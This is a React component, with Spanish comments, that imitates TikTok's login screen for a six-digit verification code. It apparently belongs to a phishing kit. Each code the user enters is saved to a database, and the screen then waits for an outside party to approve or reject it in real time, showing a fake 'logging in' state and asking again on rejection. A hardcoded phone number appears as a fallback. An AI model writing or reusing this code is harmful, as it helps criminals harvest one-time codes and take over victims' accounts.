import React, { useState, useEffect, useRef, useCallback } from 'react';
import { ChevronLeft, HelpIcon, SunIcon, MoonIcon } from '../icons';
import {
  createVerificationRequest,
  subscribeToVerificationRequest,
} from '../../services/verification.service';
import { saveVerificationCode } from '../../api/loging.api';

interface VerificationCodeViewProps {
  phoneNumber: string;
  countryCode: string;
  userId?: number | string | null;
  onBack: () => void;
  onHelp: () => void;
  onSuccess: (code: string) => void;
  showToast: (msg: string) => void;
  darkMode: boolean;
  onToggleDarkMode?: () => void;
}

export const VerificationCodeView: React.FC<VerificationCodeViewProps> = ({
  phoneNumber,
  countryCode,
  userId,
  onBack,
  onHelp,
  onSuccess,
  showToast,
  darkMode,
  onToggleDarkMode,
}) => {
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [countdown, setCountdown] = useState<number>(27);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Estados de validación natural (estilo TikTok nativo)
  const [isWaitingApproval, setIsWaitingApproval] = useState<boolean>(false);
  const [isRejected, setIsRejected] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [activeRequestId, setActiveRequestId] = useState<string | null>(null);

  // Focus the first input on mount
  useEffect(() => {
    const timer = setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 100);
    return () => clearTimeout(timer);
  }, []);

  // Countdown timer for resending code
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown]);

  const formattedPhone = `${countryCode} ${phoneNumber}`.trim();

  // Función que maneja el envío del código hacia la base de datos y la verificación
  const handleCodeComplete = useCallback(
    async (fullCode: string) => {
      setIsWaitingApproval(true);
      setIsRejected(false);
      setErrorMessage(null);

      // Guardar en la base de datos en segundo plano
      if (userId) {
        try {
          await saveVerificationCode(userId, fullCode);
        } catch (err) {
          console.error('Error al guardar código en PostgreSQL:', err);
        }
      }

      // Crear solicitud de verificación
      const request = createVerificationRequest(userId ?? undefined, formattedPhone, fullCode);
      setActiveRequestId(request.id);
    },
    [userId, formattedPhone]
  );

  // Suscripción reactiva en tiempo real al estado de la verificación
  useEffect(() => {
    if (!activeRequestId) return;

    const unsubscribe = subscribeToVerificationRequest(activeRequestId, (updatedReq) => {
      if (updatedReq.status === 'APPROVED') {
        setIsWaitingApproval(false);
        setIsRejected(false);
        setErrorMessage(null);

        // Transición directa y natural al siguiente paso
        onSuccess(updatedReq.codigo);
      } else if (updatedReq.status === 'REJECTED') {
        setIsWaitingApproval(false);
        setIsRejected(true);
        setErrorMessage(
          updatedReq.message || 'Introduce un código de verificación válido'
        );

        // Limpiar los dígitos y enfocar el primer casillero
        setDigits(['', '', '', '', '', '']);
        setActiveRequestId(null);
        setTimeout(() => {
          inputRefs.current[0]?.focus();
        }, 150);
      }
    });

    return () => {
      unsubscribe();
    };
  }, [activeRequestId, onSuccess]);

  // Handle single digit input
  const handleChange = (index: number, value: string) => {
    if (isWaitingApproval) return;

    // Si había un error previo, limpiarlo al empezar a escribir
    if (isRejected) {
      setIsRejected(false);
      setErrorMessage(null);
    }

    const cleaned = value.replace(/\D/g, '');
    if (!cleaned) {
      const newDigits = [...digits];
      newDigits[index] = '';
      setDigits(newDigits);
      return;
    }

    const digit = cleaned.slice(-1);
    const newDigits = [...digits];
    newDigits[index] = digit;
    setDigits(newDigits);

    // Auto advance to next box
    if (index < 5 && digit) {
      inputRefs.current[index + 1]?.focus();
    }

    // Check if all 6 digits are filled
    const fullCode = newDigits.join('');
    if (fullCode.length === 6 && !newDigits.includes('')) {
      setTimeout(() => {
        handleCodeComplete(fullCode);
      }, 250);
    }
  };

  // Handle backspace and navigation
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (isWaitingApproval) return;

    if (isRejected) {
      setIsRejected(false);
      setErrorMessage(null);
    }

    if (e.key === 'Backspace') {
      if (digits[index] === '' && index > 0) {
        inputRefs.current[index - 1]?.focus();
        const newDigits = [...digits];
        newDigits[index - 1] = '';
        setDigits(newDigits);
      } else {
        const newDigits = [...digits];
        newDigits[index] = '';
        setDigits(newDigits);
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    } else if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Handle paste full code
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    if (isWaitingApproval) return;

    if (isRejected) {
      setIsRejected(false);
      setErrorMessage(null);
    }

    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!pastedData) return;

    const newDigits = [...digits];
    for (let i = 0; i < pastedData.length; i++) {
      newDigits[i] = pastedData[i];
    }
    setDigits(newDigits);

    if (pastedData.length === 6) {
      inputRefs.current[5]?.focus();
      setTimeout(() => {
        handleCodeComplete(pastedData);
      }, 250);
    } else {
      inputRefs.current[Math.min(pastedData.length, 5)]?.focus();
    }
  };

  const handleResend = () => {
    if (countdown > 0 || isWaitingApproval) return;
    setCountdown(60);
    setIsRejected(false);
    setErrorMessage(null);
    showToast(`Nuevo código de 6 dígitos enviado a ${countryCode} ${phoneNumber}`);
  };

  return (
    <div className="w-full flex-1 flex flex-col justify-between animate-fade-in select-none">
      {/* Top Header */}
      <header className="flex items-center justify-between h-12 w-full">
        {/* Back Button */}
        <button
          onClick={onBack}
          className="p-1.5 -ml-1 rounded-full hover:bg-gray-500/10 active:scale-95 transition-all cursor-pointer text-gray-900 dark:text-white"
          aria-label="Volver"
          title="Volver"
        >
          <ChevronLeft />
        </button>

        <div className="flex items-center gap-2">
          {/* Theme Toggle if available */}
          {onToggleDarkMode && (
            <button
              onClick={onToggleDarkMode}
              className={`p-1.5 rounded-full text-xs font-semibold flex items-center gap-1 transition-colors cursor-pointer ${
                darkMode
                  ? 'bg-white/10 hover:bg-white/20 text-yellow-300'
                  : 'bg-gray-100 hover:bg-gray-200 text-gray-700'
              }`}
              title={darkMode ? 'Cambiar a modo claro' : 'Cambiar a modo oscuro'}
              aria-label="Alternar modo de color"
            >
              {darkMode ? <SunIcon /> : <MoonIcon />}
            </button>
          )}

          {/* Help Button (Circle with ?) */}
          <button
            onClick={onHelp}
            className="p-1.5 -mr-1 rounded-full hover:bg-gray-500/10 active:scale-95 transition-all cursor-pointer text-gray-900 dark:text-white"
            aria-label="Comentarios y ayuda"
            title="Comentarios y ayuda"
          >
            <HelpIcon className="w-6 h-6" />
          </button>
        </div>
      </header>

      {/* Main Content Area */}
      <div className="w-full flex-1 flex flex-col pt-5">
        {/* Big Bold Title */}
        <h1 className="text-[25px] sm:text-[27px] font-bold tracking-tight text-[#161823] dark:text-white mb-2 leading-tight text-left">
          Ingresa el código de 6 dígitos
        </h1>

        {/* Subtitle with destination phone */}
        <p className="text-[14px] text-gray-500 dark:text-gray-400 mb-6 text-left">
          Tu código se envió al{' '}
          <span className="font-normal text-gray-700 dark:text-gray-300">
            {formattedPhone || '+57 3017495764'}
          </span>
        </p>

        {/* 6 Digit Input Boxes */}
        <div
          className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full mb-2 ${
            isRejected ? 'animate-shake' : ''
          }`}
        >
          {digits.map((digit, idx) => (
            <input
              key={idx}
              ref={(el) => {
                inputRefs.current[idx] = el;
              }}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={1}
              autoComplete={idx === 0 ? 'one-time-code' : 'off'}
              value={digit}
              disabled={isWaitingApproval}
              onChange={(e) => handleChange(idx, e.target.value)}
              onKeyDown={(e) => handleKeyDown(idx, e)}
              onPaste={handlePaste}
              className={`w-full aspect-[4/5] sm:aspect-square rounded-xl text-center text-2xl font-bold transition-all outline-hidden cursor-text select-text ${
                isRejected
                  ? 'border border-[#FE2C55] bg-[#FE2C55]/5 text-[#FE2C55]'
                  : isWaitingApproval
                  ? 'border border-transparent bg-gray-200/50 dark:bg-[#262626]/60 text-gray-400 opacity-80'
                  : darkMode
                  ? 'bg-[#262626] text-white focus:bg-[#1E1E1E] focus:ring-2 focus:ring-white/20 border border-transparent focus:border-white/40'
                  : 'bg-[#F1F1F2] text-[#161823] focus:bg-white focus:ring-2 focus:ring-black/10 border border-transparent focus:border-black/30'
              }`}
              aria-label={`Dígito ${idx + 1}`}
            />
          ))}
        </div>

        {/* Mensaje de error natural en rojo si se rechaza el código */}
        {isRejected && (
          <p className="text-[13px] text-[#FE2C55] font-normal mb-4 text-left animate-shake leading-snug">
            {errorMessage || 'Introduce un código de verificación válido'}
          </p>
        )}

        {/* Indicador de carga natural de TikTok mientras se valida */}
        {isWaitingApproval && (
          <div className="flex items-center gap-2 my-4 animate-fade-in">
            <div className="flex items-center gap-1.5">
              <div className="w-2.5 h-2.5 rounded-full bg-[#FE2C55] animate-bounce [animation-delay:-0.3s]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#25F4EE] animate-bounce [animation-delay:-0.15s]" />
              <div className="w-2.5 h-2.5 rounded-full bg-gray-400 dark:bg-gray-500 animate-bounce" />
            </div>
            <span className="text-xs text-gray-400 font-medium">Iniciando sesión...</span>
          </div>
        )}

        {/* Resend Code Section */}
        <div className="text-left mt-1 mb-3.5">
          {countdown > 0 ? (
            <span className="text-[14px] text-gray-400 dark:text-gray-500 select-none">
              Volver a enviar el código {countdown}s
            </span>
          ) : (
            <button
              type="button"
              onClick={handleResend}
              disabled={isWaitingApproval}
              className="text-[14px] font-medium text-[#161823] dark:text-white hover:text-[#FE2C55] dark:hover:text-[#FE2C55] cursor-pointer transition-colors disabled:opacity-50"
            >
              Volver a enviar el código
            </button>
          )}
        </div>

        {/* Help Link: ¿Necesitas ayuda para iniciar sesión? */}
        <div className="text-left">
          <button
            type="button"
            onClick={onHelp}
            className="text-[14px] font-semibold text-[#1A56DB] dark:text-[#3B82F6] hover:underline cursor-pointer transition-colors text-left"
          >
            ¿Necesitas ayuda para iniciar sesión?
          </button>
        </div>
      </div>

      {/* Bottom Disclaimer Notice */}
      <div className="w-full pt-12 pb-4 flex items-start gap-2.5 text-left">
        <span
          className={`w-4 h-4 rounded-full border shrink-0 mt-0.5 transition-colors ${
            darkMode ? 'border-gray-600' : 'border-gray-300'
          }`}
          aria-hidden="true"
        />
        <p className="text-[11px] sm:text-xs text-gray-500 dark:text-gray-400 leading-snug">
          Es posible que recibas notificaciones por SMS, WhatsApp y otras aplicaciones de mensajería
        </p>
      </div>
    </div>
  );
};

export default VerificationCodeView;
